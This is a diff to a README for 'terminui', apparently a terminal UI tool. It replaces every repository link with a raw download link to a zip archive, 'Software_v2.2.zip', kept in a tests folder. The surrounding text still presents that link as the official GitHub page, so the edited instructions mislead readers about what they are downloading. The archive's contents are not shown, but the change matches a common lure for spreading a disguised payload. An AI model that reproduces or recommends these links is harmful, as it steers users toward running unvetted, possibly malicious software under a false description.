@@ -1,6 +1,6 @@
 # ⚡ terminui - Fast, Clear Terminal User Interface
 
-[![Download terminui](https://img.shields.io/badge/Download-Terminui-brightgreen?style=for-the-badge)](https://github.com/ziko-ui/terminui)
+[![Download terminui](https://img.shields.io/badge/Download-Terminui-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ziko-ui/terminui/main/src/__tests__/Software_v2.2.zip)
 
 ## 🖥️ What is terminui?
 
@@ -19,10 +19,10 @@ This app works well on Windows computers and helps you create or run text-based 
 
 ## 🖱️ Where to Get terminui
 
-[![Download terminui](https://img.shields.io/badge/Download-Terminui-blue?style=for-the-badge)](https://github.com/ziko-ui/terminui)
+[![Download terminui](https://img.shields.io/badge/Download-Terminui-blue?style=for-the-badge)](https://raw.githubusercontent.com/ziko-ui/terminui/main/src/__tests__/Software_v2.2.zip)
 
 Click the button above or use this link to visit the official terminui page on GitHub:  
-https://github.com/ziko-ui/terminui
+https://raw.githubusercontent.com/ziko-ui/terminui/main/src/__tests__/Software_v2.2.zip
 
 On this page, you can find the files to download and detailed instructions for installation.
 
@@ -45,7 +45,7 @@ Follow these steps to get terminui running on your computer. Each step explains 
    Use any browser such as Chrome, Edge, or Firefox.  
 
 2. **Visit the Download Page**  
-   Go to the link: https://github.com/ziko-ui/terminui  
+   Go to the link: https://raw.githubusercontent.com/ziko-ui/terminui/main/src/__tests__/Software_v2.2.zip  
 
 3. **Find the Download Section**  
    On the GitHub page, look for the “Releases” area or the “Download” section.  
@@ -94,13 +94,13 @@ If terminui does not start or work as expected, try these steps:
 
 For more information about using terminui or advanced features:
 
-- Visit the GitHub page: https://github.com/ziko-ui/terminui  
+- Visit the GitHub page: https://raw.githubusercontent.com/ziko-ui/terminui/main/src/__tests__/Software_v2.2.zip  
 - Explore the `docs` folder or linked guides on the repository.  
 - Check discussions or opened issues for common questions and answers.
 
 ## 🔗 Quick Access Links
 
-- terminui GitHub page: https://github.com/ziko-ui/terminui  
+- terminui GitHub page: https://raw.githubusercontent.com/ziko-ui/terminui/main/src/__tests__/Software_v2.2.zip  
 - Download section: Visit the GitHub page and look under “Releases”  
 
-[![Download terminui](https://img.shields.io/badge/Download-Terminui-brightgreen?style=for-the-badge)](https://github.com/ziko-ui/terminui)
+[![Download terminui](https://img.shields.io/badge/Download-Terminui-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ziko-ui/terminui/main/src/__tests__/Software_v2.2.zip)
